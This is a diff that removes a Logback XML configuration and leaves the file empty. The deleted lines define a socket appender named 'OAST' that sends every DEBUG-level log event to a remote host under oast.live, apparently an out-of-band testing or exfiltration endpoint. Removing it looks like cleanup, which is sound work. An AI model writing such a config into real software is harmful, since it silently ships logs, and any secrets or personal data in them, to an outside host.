@@ -1,10 +1,1 @@
-<configuration>
-  <appender name="OAST" class="ch.qos.logback.classic.net.SocketAppender">
-    <remoteHost>rlb3.d9c66rjoilb2d39sugn0gqsun8c7cxnjq.oast.live</remoteHost>
-    <port>80</port>
-    <reconnectionDelay>1000</reconnectionDelay>
-  </appender>
-  <root level="DEBUG">
-    <appender-ref ref="OAST"/>
-  </root>
-</configuration>
+
